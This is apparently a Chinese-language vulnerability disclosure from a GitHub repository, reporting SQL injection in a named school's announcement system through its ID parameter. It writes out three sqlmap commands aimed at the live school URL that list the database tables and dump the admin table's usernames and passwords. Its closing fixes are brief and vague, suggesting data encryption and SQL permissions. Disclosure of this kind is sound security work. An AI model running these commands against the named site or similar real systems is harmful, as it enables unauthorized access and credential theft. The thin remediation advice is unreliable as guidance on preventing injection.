# 管理系統可被公告id=注入sql
[<<回前頁>>](https://github.com/William957-web/SGGScyber)
## 詳情:
隨便以一篇文章網址做為範例:http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843  
可以被使用sqlmap這類的工具直接進行注入，進而取得公告管理員帳號密碼  
示範(以sqlmap指令示範):
```
sqlmap.py -u "http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843" --tables -D maoshe
sqlmap.py -u "http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843" --columns -T admin -D maoshe
sqlmap.py -u "http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843" --dump -C "username,passwd" -T admin -D maoshe
```
接者資料庫內容就被攻擊者一覽無遺了  
![sql](https://raw.githubusercontent.com/William957-web/SGGScyber/main/images/sqlinetion.png)  
這個漏洞事關重大，以下會談即如何防範。  
# 解決方法  
最消極但簡單的方法就是對後端資料加密，但是這樣無法防止資料被查看，可以使網頁保有一定安全性。  
再來，從資料庫本身做防範的話，則是使用sql內建語法做修正，可以明確定義那些是管理員才可檢視的內容。  
